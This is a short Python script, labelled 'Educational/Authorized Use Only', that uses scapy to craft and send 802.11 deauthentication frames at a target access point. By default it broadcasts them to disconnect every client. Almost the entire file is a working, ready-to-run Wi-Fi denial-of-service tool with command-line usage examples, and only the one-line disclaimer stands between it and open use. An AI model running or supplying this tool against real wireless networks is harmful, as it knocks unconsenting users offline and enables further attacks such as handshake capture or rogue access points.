
""" Wi-Fi Deauthentication Attack Tool — Educational/Authorized Use Only """

from scapy.all import *
import time
import sys

def deauth(bssid, client="FF:FF:FF:FF:FF:FF", iface="wlan0", count=100, interval=0.1):
    """Send deauth packets to target AP"""
    packet = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    
    print(f"[*] Target BSSID: {bssid}")
    print(f"[*] Client: {client}")
    print(f"[*] Interface: {iface}")
    print(f"[*] Sending {count} deauth packets...")
    
    sendp(packet, iface=iface, count=count, inter=interval, verbose=0)
    print("[+] Done!")
    
    if client == "FF:FF:FF:FF:FF:FF":
        print("[!] Broadcast mode: All clients disconnected")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python deauth.py <bssid> [client] [iface] [count]")
        print("Example: python deauth.py AA:BB:CC:DD:EE:FF")
        print("Example: python deauth.py AA:BB:CC:DD:EE:FF FF:FF:FF:FF:FF:FF wlan0 100")
        sys.exit(1)
    
    bssid = sys.argv[1]
    client = sys.argv[2] if len(sys.argv) > 2 else "FF:FF:FF:FF:FF:FF"
    iface = sys.argv[3] if len(sys.argv) > 3 else "wlan0"
    count = int(sys.argv[4]) if len(sys.argv) > 4 else 100
    
    deauth(bssid, client, iface, count)